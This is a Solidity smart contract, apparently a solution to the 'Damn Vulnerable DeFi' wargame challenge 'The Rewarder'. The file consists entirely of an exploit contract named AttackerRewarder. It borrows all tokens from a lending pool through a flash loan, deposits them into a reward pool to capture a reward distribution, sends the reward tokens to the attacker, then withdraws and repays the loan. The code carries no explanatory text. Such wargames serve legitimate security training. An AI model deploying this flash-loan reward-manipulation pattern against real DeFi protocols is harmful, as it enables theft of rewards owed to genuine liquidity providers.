// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./RewardToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;
}

contract AttackerRewarder is IFlashLoanReceiver {
    address public attacker;
    uint256 public TOKENS_IN_LENDER_POOL;

    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;

    constructor(uint256 _tokensInLenderPool, address _flashLoanerPool, address _rewarderPool) {
        attacker = msg.sender;
        TOKENS_IN_LENDER_POOL = _tokensInLenderPool;
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = TheRewarderPool(_rewarderPool).liquidityToken();
        rewardToken = TheRewarderPool(_rewarderPool).rewardToken();
    }

    function attack() external {
        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL);
    }

    function receiveFlashLoan(uint256 amount) external override {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        uint256 rewards = rewarderPool.distributeRewards();
        rewardToken.transfer(attacker, rewards);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

}